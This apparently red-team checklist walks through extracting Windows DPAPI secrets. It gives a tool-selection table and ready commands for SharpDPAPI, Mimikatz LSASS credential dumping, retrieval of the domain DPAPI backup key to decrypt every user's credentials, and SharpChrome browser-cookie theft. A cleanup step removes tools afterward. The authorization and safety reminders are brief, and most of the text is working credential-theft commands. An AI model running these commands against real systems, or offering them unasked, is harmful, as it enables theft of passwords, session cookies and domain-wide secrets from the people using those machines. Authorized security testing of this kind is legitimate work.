# DPAPI Extraction Workflow Checklist

## Pre-Extraction Assessment

- [ ] **Authorization**: Confirm you have explicit authorization to test this system
- [ ] **Access Level**: Determine your current privilege level
  - [ ] Domain Admin
  - [ ] Local Admin
  - [ ] Standard User
  - [ ] No local access (remote only)
- [ ] **Target User**: Identify which user's credentials you need
- [ ] **User Status**: Is the target user currently logged in?
- [ ] **Credentials Available**: What do you have?
  - [ ] User password
  - [ ] NTLM hash
  - [ ] Domain backup key
  - [ ] LSASS access
  - [ ] Nothing (need to obtain first)

## Tool Selection Matrix

| Scenario | Best Tool | Alternative |
|----------|-----------|-------------|
| Current user session | SharpDPAPI /unprotect | Mimikatz |
| Have password/hash | SharpDPAPI /password or /ntlm | Impacket dpapi.py |
| Domain admin | SharpDPAPI /pvk | Mimikatz backupkeys |
| User logged in, local admin | Mimikatz sekurlsa::dpapi | SharpDPAPI /rpc |
| Offline analysis | Impacket dpapi.py | SharpDPAPI |
| Chrome/Edge cookies | SharpChrome | Manual extraction |
| Remote server | SharpDPAPI /server | WMI + local tools |

## Extraction Steps by Scenario

### Scenario A: Current User Session

1. [ ] Run SharpDPAPI with /unprotect
2. [ ] Review output for credentials, vaults, RDC entries
3. [ ] Export results to file for documentation

```bash
SharpDPAPI.exe triage /unprotect > output.txt
```

### Scenario B: Offline with Password

1. [ ] Locate master key files: `%APPDATA%\Microsoft\Protect\<SID>\`
2. [ ] Identify user SID (from master key folder name)
3. [ ] Run decryption with password
4. [ ] Verify output contains expected credentials

```bash
SharpDPAPI.exe triage /target:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID> /password:PASSWORD
```

### Scenario C: Domain Admin - All Users

1. [ ] Extract domain backup key from DC
2. [ ] Collect master key files from target users
3. [ ] Decrypt all master keys with backup key
4. [ ] Extract credentials from all users

```bash
# Step 1: Get backup key
SharpDPAPI.exe backupkey /server:DC.domain /file:backup.pvk

# Step 2: Decrypt all users
SharpDPAPI.exe triage /pvk:backup.pvk
```

### Scenario D: User Logged In - LSASS Dump

1. [ ] Dump LSASS memory
2. [ ] Extract DPAPI credkeys from output
3. [ ] Use credkey for decryption (no password needed)

```bash
# Step 1: Dump LSASS
mimikatz sekurlsa::dpapi

# Step 2: Use credkey
SharpDPAPI.exe triage /credkey:SHA1_HEX
```

## Post-Extraction

- [ ] **Document findings**: Save all extracted credentials
- [ ] **Verify completeness**: Check for expected credential types
- [ ] **Clean up**: Remove tools and temporary files
- [ ] **Report**: Document methods used and results

## Common Issues & Solutions

| Issue | Solution |
|-------|----------|
| "Access denied" | Run as Administrator or SYSTEM |
| "Master key not found" | Check path, verify SID is correct |
| "Decryption failed" | Verify password/hash is correct, check for entropy |
| "No credentials found" | User may not have saved credentials, check Vault |
| "Chrome cookies empty" | May need app-bound key, run as target user |
| "Tool not found" | Download from official GitHub repos |

## Safety Reminders

- ⚠️ Only use on authorized systems
- ⚠️ Document all actions for audit trail
- ⚠️ Be aware of data privacy regulations
- ⚠️ Handle extracted credentials securely
- ⚠️ Follow responsible disclosure if finding vulnerabilities

## Quick Reference Commands

```bash
# Current session
SharpDPAPI.exe triage /unprotect

# With password
SharpDPAPI.exe triage /target:PATH /password:PASS

# With NTLM hash
SharpDPAPI.exe triage /target:PATH /ntlm:HASH

# Domain backup key
SharpDPAPI.exe triage /pvk:backup.pvk

# Chrome cookies
SharpChrome cookies /browser:chrome /unprotect

# Impacket offline
python3 dpapi.py masterkey -file GUID -sid SID -password PASS
python3 dpapi.py credential -file CRED -key 0xMASTERKEY
```
